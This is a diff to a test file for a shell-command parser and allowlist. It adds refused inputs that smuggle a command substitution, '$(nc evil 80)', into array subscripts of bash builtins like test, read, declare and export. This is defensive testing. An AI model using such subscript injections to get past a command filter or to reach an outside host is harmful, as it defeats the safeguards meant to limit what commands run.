@@ -216,6 +216,8 @@ MUST_PARSE = {
     "LANG=C git status": ["git"],
     "echo ${FOO:=bar} ${GIT_DIR:-x}": ["echo"],
     "declare -r x=1": ["declare"],
+    "test -v HOME": ["test"],
+    "[ -v HOME ] && ls": ["[", "ls"],
 }
 
 # Refused by the parser itself, not only by the allowlist (#1754 review).
@@ -245,6 +247,21 @@ ENV_KEY_PARSER_REFUSED = [
     "declare -ix x=1",
     "typeset -i x",
     "local -ri x=1",
+    "test -v 'a[$(nc evil 80)]'",
+    "[ -v 'a[$(nc evil 80)]' ]",
+    "[[ -v 'a[$(nc evil 80)]' ]]",
+    "printf -v 'a[$(nc evil 80)]' x",
+    "read 'a[$(nc evil 80)]'",
+    "mapfile 'a[$(nc evil 80)]'",
+    "readarray 'a[$(nc evil 80)]'",
+    "unset 'a[$(nc evil 80)]'",
+    "export 'a[$(nc evil 80)]'",
+    "declare 'a[$(nc evil 80)]'",
+    "local 'a[$(nc evil 80)]'",
+    "typeset 'a[$(nc evil 80)]'",
+    "readonly 'a[$(nc evil 80)]'",
+    "getopts ab 'a[$(nc evil 80)]'",
+    'test -v "$X"',
 ]
 
 # `git -c …` config injection / transport-exec hijack — must be blocked even
